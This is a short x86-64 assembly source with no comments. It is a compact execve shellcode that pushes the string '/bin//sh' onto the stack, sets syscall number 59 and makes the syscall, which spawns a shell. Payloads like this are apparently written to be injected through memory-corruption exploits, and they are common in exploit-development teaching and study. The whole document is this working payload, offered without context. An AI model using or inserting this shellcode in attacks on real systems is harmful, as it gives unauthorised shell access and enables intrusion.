global _start

section .text

_start:

    xor esi, esi
    mul esi
    push rax
    mov rdi, 0x68732f2f6e69622f
    push rdi          
    mov rdi, rsp           
    mov al, 59
    syscall
